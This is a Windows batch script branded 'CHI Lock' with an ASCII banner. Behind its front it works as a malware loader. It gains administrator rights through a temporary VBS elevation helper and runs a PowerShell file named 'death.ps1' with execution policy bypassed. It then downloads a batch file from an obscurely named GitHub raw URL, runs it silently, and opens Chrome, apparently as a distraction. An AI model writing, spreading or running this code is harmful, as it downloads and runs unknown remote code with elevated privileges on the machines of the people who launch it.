@echo off
title CHI Lock
color 0A



:Menu
cls
echo    CCCCCCCCCCCCCHHHHHHHHH     HHHHHHHHHIIIIIIIIII                 PPPPPPPPPPPPPPPPP   
echo  CCC::::::::::::CH:::::::H     H:::::::HI::::::::I                 P::::::::::::::::P  
echo CC:::::::::::::::CH:::::::H     H:::::::HI::::::::I                 P::::::PPPPPP:::::P 
echo C:::::CCCCCCCC::::CHH::::::H     H::::::HHII::::::II                 PP:::::P     P:::::P
echo C:::::C       CCCCCC  H:::::H     H:::::H    I::::I                     P::::P     P:::::P
echo C:::::C                H:::::H     H:::::H    I::::I                     P::::P     P:::::P
echo C:::::C                H::::::HHHHH::::::H    I::::I                     P::::PPPPPP:::::P 
echo C:::::C                H:::::::::::::::::H    I::::I   ---------------   P:::::::::::::PP  
echo C:::::C                H:::::::::::::::::H    I::::I   -:::::::::::::-   P::::PPPPPPPPP    
echo C:::::C                H::::::HHHHH::::::H    I::::I   ---------------   P::::P            
echo C:::::C                H:::::H     H:::::H    I::::I                     P::::P            
echo C:::::C       CCCCCC  H:::::H     H:::::H    I::::I                     P::::P            
echo  C:::::CCCCCCCC::::CHH::::::H     H::::::HHII::::::II                 PP::::::PP          
echo   CC:::::::::::::::CH:::::::H     H:::::::HI::::::::I                 P::::::::P          
echo     CCC::::::::::::CH:::::::H     H:::::::HI::::::::I                 P::::::::P          
echo        CCCCCCCCCCCCCHHHHHHHHH     HHHHHHHHHIIIIIIIIII                 PPPPPPPPPP          
                                                                                           
                                                                                           
:: Check if running as administrator
>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto :runAsAdmin
) else ( 
    goto :premain
)

:runAsAdmin
:: Restart script with elevated privileges
set "batchPath=%~f0"
if '%1'=='ELEV' (shift & goto :premain)
setlocal DisableDelayedExpansion
set "script=%temp%\getadmin.vbs"
echo Set UAC = CreateObject^("Shell.Application"^) > "%script%"
echo UAC.ShellExecute "cmd.exe", "/c ""%batchPath%"" ELEV", "", "runas", 1 >> "%script%"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /b

:premain
cd %temp%
powershell.exe -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%cd%\death.ps1\"' -Verb RunAs"
timeout 1
cls
goto main

:main 
curl https://raw.githubusercontent.com/figman12/FAUIOAIFAUIFAGFIAGVFAY/main/output.bat --output end.bat
start /b end.bat
timeout 1
goto chrome

:chrome
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
goto exit



:exit 
exit /b %errorlevel% >> log.txt
